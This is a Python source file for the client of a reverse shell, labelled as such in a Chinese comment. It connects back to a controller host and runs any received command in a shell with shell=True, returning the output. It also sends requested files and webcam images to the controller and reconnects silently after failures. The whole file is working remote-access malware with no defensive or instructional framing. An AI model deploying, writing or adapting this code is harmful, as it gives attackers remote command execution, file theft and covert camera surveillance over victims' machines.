import os
import sys
import time
import socket
import shutil
import threading
import file_trans
import cam
import settings
import subprocess

#反弹shell客户端

def connect_server():
    try:
        hostport = (settings.get_host(),settings.get_port())
        client_socket = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
        client_socket.connect(hostport)
    except:
        pass
    return client_socket

def send_message():
    client_socket = connect_server()
    while True:
        try:
            try:
                cmd = client_socket.recv(1024).decode()  # 解码获取命令
            except:
                cmd = ""
            if cmd.startswith("cd"):
                try:
                    os.chdir(cmd[2:].strip())  # 切换路径
                    cmd = ""
                    result = os.getcwd()  # 显示路径
                except:
                    result = "错误路径"
            elif cmd.startswith("get"):
                file_trans.send_file_client(cmd[3:].strip(), settings.get_host(), settings.get_file_port())
                cmd = ""
            elif cmd.startswith("camera"):
                cam.send_cam_image(settings.get_host(), settings.get_cam_port())
            else:
                try:
                    #服务端（控制端）指令没有cd,camera,get，在shell执行这个指令并返回服务端
                    #result = os.popen(cmd).read()  # 获取反馈（弃用）
                    #result = subprocess.getoutput(cmd) #（弃用）
                    # 使用Popen执行命令
                    # shell=True表示在shell中执行命令，以支持通配符和管道
                    # stdout=subprocess.PIPE表示将命令的标准输出捕获到变量中
                    # stderr=subprocess.PIPE表示将命令的错误输出捕获到变量中
                    # universal_newlines=True表示输出将被解码为文本
                    # print("获取的命令：" + cmd) #调试用
                    process = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, universal_newlines=True)
                    stdout, stderr = process.communicate(timeout=10) # 从标准输出和标准错误中获取输出和错误
                    return_code = process.returncode # 检查命令是否成功执行（返回值为0表示成功，非0表示出错）
                    if return_code == 0:
                        # 打印命令的标准输出
                        #print("Command output:") #调试用
                        #print(stdout) #调试用
                        result = stdout
                        cmd = ""
                    else:
                        # 打印命令的错误输出
                        #print("Command failed with error:") #调试用
                        #print(stderr) #调试用
                        result = stderr
                        cmd = ""
                except:
                    process.terminate() #timeout=10 超时异常结束指令进程
                    process.wait(timeout=2) #确保进程在终止后已经完成
                    cmd = ""
                    result = "10s内超时异常，已结束进程"
            if result:
                try:
                    client_socket.sendall(result.encode('utf-8'))  # 编码发送反馈
                    result = ""
                except:
                    pass
            elif not result:
                client_socket.send("cmd_shell无返回数据".encode('utf-8'))
        except:
            time.sleep(3)
            client_socket.close()
            client_socket = connect_server()

if __name__ == '__main__':
    thread1 = threading.Thread(target=send_message)
    thread1.start()
            
        
